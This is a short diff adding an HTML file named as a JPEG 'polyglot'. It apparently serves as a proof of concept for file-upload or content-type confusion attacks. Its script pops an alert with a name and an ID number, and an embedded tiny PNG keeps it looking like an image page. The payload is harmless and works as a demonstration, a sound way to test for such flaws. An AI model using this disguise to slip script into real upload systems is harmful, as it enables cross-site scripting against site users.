@@ -1,0 +1,15 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>alert.jpg (HTML polyglot)</title>
+</head>
+<body>
+  <script>
+    alert("Daniel Kanybekov 25118080902");
+  </script>
+
+  <!-- show a tiny embedded image so the file still looks like an image page -->
+  <img alt="small" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=">
+</body>
+</html>
